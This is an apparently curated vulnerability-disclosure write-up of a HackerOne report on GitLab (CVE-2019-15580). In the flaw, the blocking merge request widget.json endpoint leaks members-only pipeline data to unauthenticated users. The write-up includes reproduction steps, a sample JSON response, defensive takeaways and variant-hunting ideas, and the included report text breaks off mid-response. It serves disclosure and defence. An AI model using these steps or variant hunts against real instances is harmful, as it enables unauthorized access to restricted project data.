# Pipeline Information Leaked via Blocking Merge Request Feature in GitLab

## Metadata
- **Source:** HackerOne
- **Report:** 667408 | https://hackerone.com/reports/667408
- **Submitted:** 2019-08-05
- **Reporter:** xanbanx
- **Program:** GitLab
- **Bounty:** Not specified in report
- **Severity:** Medium
- **Vuln:** Broken Access Control, Information Disclosure, Authorization Bypass
- **CVEs:** CVE-2019-15580
- **Category:** uncategorised

## Summary
GitLab's blocking merge request feature failed to enforce pipeline visibility restrictions, allowing unauthenticated users to access sensitive pipeline data that was restricted to project members only. The `/merge_requests/{id}/widget.json` endpoint returned complete pipeline details including status, CI/CD results, and user information for blocking merge requests, bypassing the project's pipeline visibility settings.

## Attack scenario
1. Attacker identifies a public GitLab project with pipeline visibility restricted to members only
2. Attacker creates or identifies a merge request that has blocking merge requests configured
3. Attacker accesses the widget.json endpoint for the dependent merge request without authentication
4. Endpoint returns full pipeline data from blocking merge requests in the response
5. Attacker extracts sensitive CI/CD pipeline information, build statuses, and user details
6. Attacker uses this information for reconnaissance, competitive intelligence, or to identify vulnerable build configurations

## Root cause
The blocking merge request feature did not inherit or enforce the pipeline visibility permissions of the parent merge request. The widget.json endpoint failed to validate that the requesting user had permission to view pipeline data before including it in the response for blocking merge request references.

## Attacker mindset
An attacker would exploit this to bypass deliberately configured access controls on CI/CD pipelines. The ability to access restricted pipeline data without authentication provides valuable reconnaissance information about build processes, deployment status, and CI/CD configuration that should be confidential.

## Defensive takeaways
- Always propagate access control checks through all data dependencies and related objects
- Apply consistent visibility/permission rules across feature interactions, especially new features
- Implement centralized authorization checks that apply to all API endpoints returning sensitive data
- Review all endpoints returning related object data to ensure permission inheritance
- Test new features specifically for permission bypass vectors with related objects
- Use authorization middleware that prevents unauthorized data exposure regardless of endpoint

## Variant hunting
Search for other GitLab features that reference or display pipeline data without explicit authorization checks: approval endpoints, merge request diff endpoints, pipeline history/details in other widgets, CI/CD status displays in project views, blocking issue features if similar authorization delegation patterns exist.

## MITRE ATT&CK
- T1190 - Exploit Public-Facing Application
- T1526 - Reconnaissance
- T1538 - Cloud Service Discovery
- T1087 - Account Discovery

## Notes
This vulnerability demonstrates how new features can inadvertently bypass existing security controls when they interact with restricted data. The use of a JSON widget endpoint for merge request data is common but requires careful permission validation. The report shows GitLab had pipeline visibility settings but failed to enforce them consistently across all feature interactions, particularly in the blocking MR feature that was recently added.

## Full report
<details><summary>Expand</summary>

### Summary

GitLab allows for public and internal projects to restrict the visibility of pipelines to project members only. Then, only project members should have access to the pipeline information.

GitLab recently added the blocking merge request feature. This feature can be used to leak the head pipeline thus bypassing the access control.

### Steps to reproduce

1. Create a public project, set Pipelines visibility to project members only, and disable public pipelines
2. Push some code and create a first merge request
3. Create a second merge request and add the first MR as a blocking MR
4. As a unauthenticated user visit the following page: `https://example.gitlab.com/<namespace>/<project-name>/merge_requests/2/widget.json`

This returns the JSON data for the merge request like the following example:

```json
{
    "id": 34440035,
    "iid": 2,
    "description": "",
    "title": "Add new file",
    "approvals_before_merge": 0,
    "blob_path": {
        "head_path": "/wter23/test-blocking-mr-ci/blob/efe31a3611750142b47c5d9de374cd403d66c555",
        "base_path": "/wter23/test-blocking-mr-ci/blob/1261949f29fd17e908f26a3e5461ff92ba6557ab"
    },
    "pipeline_id": 74726702,
    "vulnerability_feedback_path": "/wter23/test-blocking-mr-ci/vulnerability_feedback",
    "create_vulnerability_feedback_issue_path": null,
    "create_vulnerability_feedback_merge_request_path": null,
    "create_vulnerability_feedback_dismissal_path": null,
    "rebase_commit_sha": null,
    "rebase_in_progress": false,
    "merge_pipelines_enabled": false,
    "can_push_to_source_branch": false,
    "has_approvals_available": true,
    "rebase_path": null,
    "approvals_path": "/wter23/test-blocking-mr-ci/merge_requests/2/approvals",
    "api_approvals_path": "/api/v4/projects/13656291/merge_requests/2/approvals",
    "api_approval_settings_path": "/api/v4/projects/13656291/merge_requests/2/approval_settings",
    "api_approve_path": "/api/v4/projects/13656291/merge_requests/2/approve",
    "api_unapprove_path": "/api/v4/projects/13656291/merge_requests/2/unapprove",
    "blocking_merge_requests": {
        "total_count": 1,
        "hidden_count": 0,
        "visible_merge_requests": {
            "opened": [
                {
                    "id": 34439968,
                    "iid": 1,
                    "title": "Add new file",
                    "state": "opened",
                    "reference": "!1",
                    "web_url": "/wter23/test-blocking-mr-ci/merge_requests/1",
                    "head_pipeline": {
                        "id": 74726535,
                        "sha": "e241af2ea6ee0e1292fa02c5e59c3ffc68311fa2",
                        "ref": "first",
                        "status": "success",
                        "web_url": "https://gitlab.com/wter23/test-blocking-mr-ci/pipelines/74726535",
                        "before_sha": "0000000000000000000000000000000000000000",
                        "tag": false,
                        "yaml_errors": null,
                        "user": {
                            "id": 4147327,
                            "name": "wter23",
                            "username": "wter23",
                            "state": "active",
                            "avatar_url": "https://secure.gravatar.com/avatar/a12221ea7cab0b84c088f1ab6e02724b?s=80&d=identicon",
                            "web_url": "https://gitlab.com/wter23"
                        },
                        "created_at": "2019-08-05T11:39:32.249Z",
                        "updated_at": "2019-08-05T11:44:16.900Z",
                        "started_at": "2019-08-05T11:39:33.294Z",
                        "finished_at": "2019-08-05T11:44:16.889Z",
                        "committed_at": null,
                        "duration": 277,
                        "coverage": null,
                        "detailed_status": {
                            "icon": "status_success",
                            "text": "passed",
                            "label": "passed",
                            "group": "success",
                            "tooltip": "passed",
                            "has_details": false,
                            "details_path": "/wter23/test-blocking-mr-ci/pipelines/74726535",
                            "illustration": null,
                            "favicon": "https://gitlab.com/assets/ci_favicons/favicon_status_success-8451333011eee8ce9f2ab25dc487fe24a8758c694827a582f17f42b0a90446a2.png"
                        }
                    },
                    "assignees": [],
                    "milestone": null,
                    "created_at": "2019-08-05T11:39:50.598Z",
                    "merged_at": null,
                    "closed_at": null
                }
            ]
        }
    },
    "state": "opened",
    "in_progress_merge_commit_sha": null,
    "merge_commit_sha": null,
    "short_merge_commit_sha": null,
    "merge_error": null,
    "merge_params": {
        "force_remove_source_branch": "0"
    },
    "merge_status": "can_be_merged",
    "merge_user_id": null,
    "auto_merge_enabled": false,
    "auto_merge_strategy": null,
    "available_auto_merge_strategies": [],
    "source_branch": "second",
    "source_branch_protected": false,
    "source_project_id": 13656291,
    "source_project_full_path": "wter23/test-blocking-mr-ci",
    "squash": false,
    "target_branch": "master",
    "target_branch_sha": "1261949f29fd17e908f26a3e5461ff92ba6557ab",
    "target_project_id": 13656291,
    "target_project_full_path": "wter23/test-blocking-mr-ci",
    "allow_collaboration": false,
    "should_be_rebased": false,
    "ff_only_enabled": false,
    "metrics": null,
    "merge_user": null,
    "diff_head_sha": "efe31a3611750142b47c5d9de374cd403d66c555",
    "default_squash_commit_message": "Add new file",
    "default_merge_commit_message": "Merge branch 'second' into 'master'\n\nAdd new file\n\nSee merge request wter23/test-blocking-mr-ci!2",
    "default_merge_commit_message_with_description": "Merge branch 'second' into 'master'\n\nAdd new file\n\nSee merge request wter23/test-blocking-mr-ci!2",
    "commits_without_merge_commits": [
        {
            "message": "Add new file",
            "short_id": "efe31a36",
            "title": "Add new file"
        }
    ],
    "commits_count": 1,
    "merge_ongoing": false,
    "work_in_progress": false,
    "source_branch_exists": true,
    "mergeable_discussions_state": true,
    "branch_missing": false,
    "has_conflicts": false,
    "can_be_merged": true,
    "mergeable": false,
    "remove_source_branch": false,
    "project_archived": false,
    "only_allow_merge_if_pipeline_succeeds": false,
    "has_ci": true,
    "ci_status": "success",
    "source_branch_with_namespace_link": "<a href=\"/wter23/test-blocking-mr-ci/tree/second\">second</a>",
    "source_branch_path": "/wter23/test-blocking-mr-ci/-/branches/second",
    "current_user": {
        "can_remove_source_branch": false,
        "can_revert_on_current_merge_request": false,
        "can_cherry_pick_on_current_merge_request": false,
        "can_create_note": false,
        "can_create_issue": false,
        "can_update": false
    },
    "target_branch_commits_path": "/wter23/test-blocking-mr-ci/commits/master",
    "target_branch_tree_path": "/wter23/test-blocking-mr-ci/tree/master",
    "new_blob_path": null,
    "conflict_resolution_path": null,
    "remove_wip_path": null,
    "cancel_auto_merge_path": null,
    "create_issue_to_resolve_discussions_path": null,
    "merge_path": null,
    "cherry_pick_in_fork_path": null,
    "revert_in_fork_path": null,
    "email_patches_path": "/wter23/test-blocking-mr-ci/merge_requests/2.patch",
    "plain_diff_path": "/wter23/test-blocking-mr-ci/merge_requests/2.diff",
    "merge_request_basic_path": "/wter23/test-blocking-mr-ci/merge_requests/2.json?serializer=basic",
    "merge_request_widget_path": "/wter23/test-blocking-mr-ci/merg

</details>

---
*Analysed by Claude on 2026-05-24*
